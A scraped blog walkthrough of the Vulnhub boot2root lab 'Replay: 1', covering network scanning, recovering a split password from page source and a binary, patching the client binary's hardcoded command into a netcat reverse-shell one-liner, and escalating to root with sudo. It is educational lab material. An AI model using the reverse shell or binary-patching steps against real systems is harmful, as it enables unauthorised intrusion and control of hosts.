@@ -1,0 +1,272 @@
+
+								
+																		Replay: 1: Vulnhub Lab Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on March 4, 2019
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello friends! Today we are going to take another boot2root challenge known as “Replay: 1”. The credit for making this VM machine goes to “c0rruptedb1t” and it is another boot2root challenge in which our goal is to get root access to complete the challenge. You can download this VM here.
+Security Level: Intermediate
+Flags: There is one flag (flag.txt).
+Penetrating Methodology:
+
+IP Discovery using netdiscover
+Network scanning (Nmap)
+Surfing HTTPS service port (80)
+Enumerating password from Source code.
+Enumerating robots.txt and finding the zip file
+Unzipping zip file
+Enumerating password from the binary file
+Enumerating the hardcoded command
+Editing the hardcoded command
+Getting a reverse shell
+Enumerating password for the user
+Elevate Privileges to get root
+Getting Flag
+
+Walkthrough
+Let’s start off with scanning the network to find our target.
+
+		
+		
+			
+			
+			
+			
+netdiscover
+			
+				
+					
+				
+					1
+				
+						netdiscover
+					
+				
+			
+		
+
+
+We found our target –&gt; 192.168.1.37
+Our next step is to scan our target with nmap.
+
+		
+		
+			
+			
+			
+			
+nmap -p- -A 192.168.1.37
+			
+				
+					
+				
+					1
+				
+						nmap -p- -A 192.168.1.37
+					
+				
+			
+		
+
+
+The NMAP output shows us that there are 3 ports open: 22(SSH), 80(HTTP), 1337(Unknown)
+
+We find that port 80 is running http, so we open the IP in our browser.
+We take a look at the source code of web page and at the top of the source code, we find a string inside a comment. We are not able to do anything with it, so we save it for later.
+
+Nmap scan shows us that there is one entry inside robots.txt. We open robots.txt and find an entry called “/bob_db.zip”.
+
+We open the link and download the zip file from the web server. After downloading the file, we extract it and find 64-bit ELF file and a text file. We take a look at the content of the text file and don’t find anything of use.
+
+When we run the application “client.bin”, it asks for an IP address and a password.
+
+As we have no clue for the password, we check the strings inside the application and there we find a hint for the password. Inside the application, we find the second half of the password. Now earlier inside the web page, we found a strange string that might be the first half of the password.
+Password: qGQjwO4h6gh0TAIRNXuQcDu9Lqsyul
+ 
+We joined the string and use it as a password for the application. After giving the password, we successfully able to login, and find that we can run commands. But when we type a command we get an error stating that we are sending unauthorized packets and the connection gets closed.
+
+Now when we take a closer look at the application we find that the command “;whoami” is hardcoded in the application.
+
+We try to edit the application and change “;whoami” command to something else and find that the size of string inside the application should remain the same and the command should always start with a semi-colon. So we changed the “;whoami” to “;uname -a” keeping the number of characters inside the application the same by replacing existing characters inside the application.
+
+Now when we run the application and give the password we are successfully able to execute our command.
+
+Now we replace the entire string with our netcat reverse shell one-liner and used extra characters to keep the size of the application the same.
+
+		
+		
+			
+			
+			
+			
+nc -e /bin/bash 192.168.1.25 4444;ls;ls;ls;ls;ls;ls;ls;
+			
+				
+					
+				
+					1
+				
+						nc -e /bin/bash 192.168.1.25 4444;ls;ls;ls;ls;ls;ls;ls;
+					
+				
+			
+		
+
+
+Now we run the application and give the correct the password.
+
+We setup our listener and are successfully able to get a reverse shell. After getting a reverse shell we spawn a TTY shell using python.
+
+		
+		
+			
+			
+			
+			
+nc -lvp 4444
+python -c 'import pty;pty.spawn("/bin/bash")'
+			
+				
+					
+				
+					12
+				
+						nc -lvp 4444python -c 'import pty;pty.spawn("/bin/bash")'
+					
+				
+			
+		
+
+
+Enumerating through the directories inside “~/Documents/.ftp” we find a file called “users.passwd”. We open it and find the password for user “bob”. Now we check the sudoers list and find that we can run all commands as root user.
+
+		
+		
+			
+			
+			
+			
+sudo -l
+			
+				
+					
+				
+					1
+				
+						sudo -l
+					
+				
+			
+		
+
+
+As we have the password for user bob, we spawn a shell as the root user. We go to “/” directory and find a file called “flag.txt”. We take a look at the content of the file and find the congratulatory flag.
+
+		
+		
+			
+			
+			
+			
+sudo -i 
+cd /
+cat flag.txt
+			
+				
+					
+				
+					123
+				
+						sudo -i cd /cat flag.txt
+					
+				
+			
+		
+
+
+Author: Sayantan Bera is a technical writer at hacking articles and cybersecurity enthusiast. Contact Here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
